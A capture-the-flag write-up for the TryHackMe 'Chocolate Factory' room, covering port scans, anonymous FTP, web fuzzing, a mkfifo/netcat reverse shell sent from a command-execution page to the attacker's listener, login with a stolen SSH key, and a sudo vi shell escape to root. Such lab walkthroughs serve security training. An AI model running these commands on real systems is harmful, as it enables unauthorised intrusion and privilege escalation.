---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/chocolate-factory/","tags":["CTF","write-up"]}
---


![Pasted image 20241129074149.png](/img/user/attachments/Pasted%20image%2020241129074149.png)

---

> [!INFO] Info about Chocolate Factory
>  A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!
>  
>   **Welcome to Willy Wonka's Chocolate Factory!**
>   
>   ![Pasted image 20241129074218.png](/img/user/attachments/Pasted%20image%2020241129074218.png)
>   
>   This room was designed so that hackers can revisit the Willy Wonka's Chocolate Factory and meet Oompa Loompa
>   
>   This is a beginner friendly room!

> [!FAQ]- Hints
> No Hints.

---
# Active reconnaissance
## Host discovery
## Port scan
Executing a fast general scan to all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT    STATE SERVICE    REASON
21/tcp  open  ftp        syn-ack ttl 61
22/tcp  open  ssh        syn-ack ttl 61
80/tcp  open  http       syn-ack ttl 61
100/tcp open  newacct    syn-ack ttl 61
101/tcp open  hostname   syn-ack ttl 61
102/tcp open  iso-tsap   syn-ack ttl 61
103/tcp open  gppitnp    syn-ack ttl 61
104/tcp open  acr-nema   syn-ack ttl 61
105/tcp open  csnet-ns   syn-ack ttl 61
106/tcp open  pop3pw     syn-ack ttl 61
107/tcp open  rtelnet    syn-ack ttl 61
108/tcp open  snagas     syn-ack ttl 61
109/tcp open  pop2       syn-ack ttl 61
110/tcp open  pop3       syn-ack ttl 61
111/tcp open  rpcbind    syn-ack ttl 61
112/tcp open  mcidas     syn-ack ttl 61
113/tcp open  ident      syn-ack ttl 61
114/tcp open  audionews  syn-ack ttl 61
115/tcp open  sftp       syn-ack ttl 61
116/tcp open  ansanotify syn-ack ttl 61
117/tcp open  uucp-path  syn-ack ttl 61
118/tcp open  sqlserv    syn-ack ttl 61
119/tcp open  nntp       syn-ack ttl 61
120/tcp open  cfdptkt    syn-ack ttl 61
121/tcp open  erpc       syn-ack ttl 61
122/tcp open  smakynet   syn-ack ttl 61
123/tcp open  ntp        syn-ack ttl 61
124/tcp open  ansatrader syn-ack ttl 61
125/tcp open  locus-map  syn-ack ttl 61
```

---
# Enumeration
Executing a deep scan with common scripts only to ports that we are interested.
```shell
sudo nmap TARGET_IP -sCV -p 21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -oN nmap_enum
```
## OS
Linux, Ubuntu
## Ports 100-125
All ports content this.
```c
| fingerprint-strings:
|   GetRequest, Help:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
```
## Port 22 - SSH
22/tcp  open  ssh         **OpenSSH 7.6p1** Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
## Port 21 - FTP
21/tcp  open  ftp         vsftpd **3.0.3**
An image is exposed on the server
```c
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
   9   │ |_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
  10   │ | ftp-syst:
  11   │ |   STAT:
  12   │ | FTP server status:
  13   │ |      Connected to ::ffff:10.6.2.59
  14   │ |      Logged in as ftp
  15   │ |      TYPE: ASCII
  16   │ |      No session bandwidth limit
  17   │ |      Session timeout in seconds is 300
  18   │ |      Control connection is plain text
  19   │ |      Data connections will be plain text
  20   │ |      At session startup, client count was 1
  21   │ |      vsFTPd 3.0.3 - secure, fast, stable
```
## Port 80 - Apache
  80/tcp  open  http        **Apache** httpd **2.4.29** ((Ubuntu))
![Pasted image 20241129111416.png|500](/img/user/attachments/Pasted%20image%2020241129111416.png)
To make it friendly add to the `/etc/hosts/`
```shell
sudo echo "10.10.225.54 chocolatefactory.thm" | sudo tee -a /etc/hosts
```

---
# Vulnerability analysis
## Port 22 - SSH
The version OpenSSH 7.6p1 is apparently vulnerable to user enumeration, but we need an active session
## Port 21 - FTP
The version vsftpd 3.0.3 is vulnerable to remote Dos, useless in this case.
## Port 80 - Apache
This version Apache httpd 2.4.29 is vulnerable to privilege escalation, could be important later.
![Pasted image 20241129105810.png](/img/user/attachments/Pasted%20image%2020241129105810.png)

---
# Exploitation
## Port 21 - FTP
Connect and get the file detailed by nmap above.
![Pasted image 20241129110653.png|600](/img/user/attachments/Pasted%20image%2020241129110653.png)
![Pasted image 20241129111021.png|400](/img/user/attachments/Pasted%20image%2020241129111021.png)
The image is apparently not relevant, but I toke note of some words:
doublemint, wrigley's, sugarfree fum
## Port 80 - Apache
The username enumerations is not possible
### Fuzzing
Try fuzzing subdirectories and files with extensions.
```shell
ffuf -c -t 100 -u http://chocolatefactory.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -mc all -fc 404 -e .php,.html,.txt
```
![Pasted image 20241129151515.png](/img/user/attachments/Pasted%20image%2020241129151515.png)
### home.php
Go to the page, we can execute commands.
![Pasted image 20241129151611.png](/img/user/attachments/Pasted%20image%2020241129151611.png)
Try to send a reverse shell
1. Set the listener
```shell
rlwrap nc -lnvp 4747
```
2. Write the code and execute
```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.2.59 4747 >/tmp/f
```
![Pasted image 20241129152148.png](/img/user/attachments/Pasted%20image%2020241129152148.png)
We receive the shell
![Pasted image 20241129152046.png](/img/user/attachments/Pasted%20image%2020241129152046.png)
Optionally you can [[Notes/Upgrading shell\|Upgrading shell]]

---
# Privilege escalation
Exploring the home directory we found a pair of ssh keys and probably the user flag, but we cannot read it yet. Anyway we are interested in the private key, depending on the configuration we probably could use it to log in via SSH as the user `charlie`
![Pasted image 20241129155157.png](/img/user/attachments/Pasted%20image%2020241129155157.png)
## SSH access
Copy the content of the key on our machine (`teleport`) in this case
Change the permission
```shell
chmod 600 teleport
```
And connect
```shell
ssh -i teleport charlie@10.10.19.210
```
![Pasted image 20241129155757.png|600](/img/user/attachments/Pasted%20image%2020241129155757.png)
It works.
> [!check] User flag
> ![Pasted image 20241129160001.png](/img/user/attachments/Pasted%20image%2020241129160001.png)
On the `/vas/www/html` we found some files that we can't access.
![Pasted image 20241129161755.png](/img/user/attachments/Pasted%20image%2020241129161755.png)
Now we can handle them. The  probable key named `key_rev_key` is an executable
Try to get strings
```shell
strings key_rev_key
```
And we got it

> [!check] Key
> ![Pasted image 20241129161954.png](/img/user/attachments/Pasted%20image%2020241129161954.png)

Check the `validate.php` file to search the charlie's password
> [!check] Charlie's password
> ![Pasted image 20241129181653.png](/img/user/attachments/Pasted%20image%2020241129181653.png)
## sudo
We are charlie, check `sudo -l`
![Pasted image 20241129160821.png](/img/user/attachments/Pasted%20image%2020241129160821.png)
Check https://gtfobins.github.io/
![Pasted image 20241129160927.png](/img/user/attachments/Pasted%20image%2020241129160927.png)
Execute
```shelll
sudo vi -c ':!/bin/sh' /dev/null
```

We are root
![Pasted image 20241129161059.png](/img/user/attachments/Pasted%20image%2020241129161059.png)
## Root flag
Go to `/root`
Run python script and enter the key found before
```shell
python root.py
```
> [!check] Root flag
> ![Pasted image 20241129165011.png|600](/img/user/attachments/Pasted%20image%2020241129165011.png)